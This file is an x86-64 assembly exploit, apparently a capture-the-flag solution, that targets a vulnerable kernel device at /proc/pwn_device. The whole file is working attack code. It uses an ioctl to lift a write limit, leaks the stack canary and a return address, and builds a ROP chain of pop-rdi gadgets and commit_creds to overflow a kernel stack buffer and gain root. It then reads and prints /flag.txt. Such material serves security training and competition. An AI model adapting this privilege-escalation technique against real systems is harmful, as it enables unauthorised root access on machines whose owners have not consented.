bits 64

commit_creds_addr equ 0xffffffffbae87e80
sread_return_addr equ 0xffffffffbb03e347

read_amount equ 0x140
read_canary_offset equ 0x80
read_retaddr_offset equ 0x90

gadget_pop_rdi equ 0xac9
gadget_ret equ 0xaca

write_canary_offset equ 0x80
write_retaddr_offset equ 0x90
write_amount equ (write_retaddr_offset + 0x48)

flag_max equ 0x1000

section .text

global _start
_start:
	; open device file
	mov eax, 2
	mov rdi, device_file
	mov esi, 2
	syscall
	test rax, rax
	js error
	mov [fd], rax

	; extend write limit (ioctl)
	mov eax, 16
	mov rdi, [fd]
	mov esi, 0x20
	mov edx, 0x77777777
	syscall

	; read data
	xor eax, eax
	mov rdi, [fd]
	mov rsi, read_buf
	mov edx, read_amount
	syscall

	; read address returned by prepare_kernel_cred(0)
	xor eax, eax
	xor edi, edi
	mov rsi, address_buf
	mov edx, 8
	syscall

	; construct payload
	mov rax, [read_buf + read_canary_offset]
	mov [payload_buf + write_canary_offset], rax
	mov rdx, [read_buf + read_retaddr_offset]
	; pop rdi; ret
	lea rax, [rdx + gadget_pop_rdi]
	mov [payload_buf + write_retaddr_offset], rax
	; the address
	mov rax, [address_buf]
	bswap rax
	mov qword [payload_buf + (write_retaddr_offset + 0x08)], rax
	; ret
	lea rax, [rdx + gadget_ret]
	mov [payload_buf + (write_retaddr_offset + 0x10)], rax
	; commit_creds
	lea rax, [rdx + (commit_creds_addr - sread_return_addr)]
	mov [payload_buf + (write_retaddr_offset + 0x18)], rax
	; pop rdi; ret
	lea rax, [rdx + gadget_pop_rdi]
	mov [payload_buf + (write_retaddr_offset + 0x20)], rax
	; pop rdi; ret
	lea rax, [rdx + gadget_pop_rdi]
	mov [payload_buf + (write_retaddr_offset + 0x30)], rax
	; pop rdi; ret
	lea rax, [rdx + gadget_pop_rdi]
	mov [payload_buf + (write_retaddr_offset + 0x40)], rax

	; write payload
	mov eax, 1
	mov rdi, [fd]
	mov rsi, payload_buf
	mov edx, write_amount
	syscall

	; open flag.txt
	mov eax, 2
	mov rdi, flag_file
	xor esi, esi
	syscall
	test rax, rax
	js error

	; read flag.txt
	mov rdi, rax
	xor eax, eax
	mov rsi, flag_buf
	mov edx, flag_max
	syscall

	; write what is read
	mov rdx, rax
	mov eax, 1
	mov rdi, 1
	mov rsi, flag_buf
	syscall

	; exit
	mov eax, 60
	xor edi, edi
	syscall

error:
	mov eax, 1
	mov edi, 1
	mov rsi, error_text
	mov edx, error_text_end - error_text
	syscall
	mov eax, 60
	mov edi, 1
	syscall

section .data

device_file:
	db '/proc/pwn_device', 0

flag_file:
	db '/flag.txt', 0

error_text:
	db 'error', 0x0a
error_text_end:

section .bss

fd:
	resq 1

address_buf:
	resq 1

read_buf:
	resb read_amount

payload_buf:
	resb write_amount

flag_buf:
	resb flag_max
